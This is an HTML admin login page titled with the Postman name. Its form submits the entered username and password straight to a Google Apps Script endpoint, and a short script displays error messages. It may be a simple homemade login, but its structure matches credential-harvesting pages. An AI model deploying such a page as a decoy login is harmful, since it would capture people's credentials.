<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Postman</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'Inter', sans-serif; }
        .card {
            background-color: white;
            padding: 2rem;
            border-radius: 0.75rem;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        }
    </style>
</head>
<body class="bg-gray-100 min-h-screen flex items-center justify-center">

    <main class="w-full max-w-md">
        <!-- The form now submits directly to the script URL and targets the top-level window -->
        <form class="card" method="POST" action="https://script.google.com/macros/s/AKfycbxZfIBGWi13GE1SXwn7kLhKYKvQS-sEPXE-iuUtCs9RfW7C7zB8yGeRjWxbZRAg54lkEg/exec" target="_top">
            <h1 class="text-2xl font-bold text-center text-gray-800 mb-6">Admin Login</h1>
            <div class="space-y-4">
                <div>
                    <label for="username" class="block text-sm font-medium text-gray-700">Username</label>
                    <!-- The 'name' attribute is crucial for form submission -->
                    <input type="text" id="username" name="username" class="mt-1 block w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-700" required>
                </div>
                <div>
                    <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
                    <input type="password" id="password" name="password" class="mt-1 block w-full p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-700" required>
                </div>
                <!-- This is now a submit button -->
                <button type="submit" id="login-form-button" class="w-full px-6 py-3 bg-blue-800 text-white font-semibold rounded-lg hover:bg-blue-900 transition-colors">
                    Login
                </button>
            </div>
            <div id="login-message" class="mt-4 text-center text-sm text-red-600"></div>
        </form>
    </main>

    <script>
        // This script now only checks for error messages in the URL
        document.addEventListener('DOMContentLoaded', () => {
            const messageDiv = document.getElementById('login-message');
            const urlParams = new URLSearchParams(window.location.search);
            
            if (urlParams.has('error')) {
                const errorType = urlParams.get('error');
                if (errorType === '1') {
                    messageDiv.textContent = 'Invalid username or password. Please try again.';
                } else {
                    messageDiv.textContent = 'An unexpected error occurred. Please contact support.';
                }
            }
        });
    </script>
</body>
</html>
